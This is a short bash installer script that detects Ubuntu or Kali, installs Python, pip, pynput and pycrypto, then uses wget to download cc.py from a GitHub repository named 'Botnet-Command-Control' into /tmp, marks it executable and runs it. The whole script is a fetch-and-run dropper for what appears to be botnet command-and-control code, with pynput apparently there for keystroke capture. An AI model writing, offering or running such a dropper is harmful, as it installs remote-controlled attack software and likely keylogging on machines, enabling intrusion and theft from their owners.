#!/bin/bash

VERSION=$(lsb_release -a)
UBUNTU='Ubuntu'
KALI='Kali'


if [[ "$VERSION" == *"$UBUNTU"* ]];
then
    sudo apt-get install python3.6
    sudo apt-get install python3-pip
    pip3 install pynput
    pip3 install pycrypto
    sudo apt-get install wget
    cd /tmp/
    wget https://raw.githubusercontent.com/binexisHATT/Botnet-Command-Control/master/scripts/net/cc.py
    chmod +x /tmp/cc.py
    /tmp/cc.py
fi

if [[ "$VERSION" == *"$KALI"* ]];
then
    sudo apt install python3.6
    sudo apt install python3-pip
    sudo apt install wget
    pip3 install pynput
    pip3 install pycrypto
    cd /tmp/
    wget https://raw.githubusercontent.com/binexisHATT/Botnet-Command-Control/master/scripts/net/cc.py
    chmod +x /tmp/cc.py
    /tmp/cc.py
fi

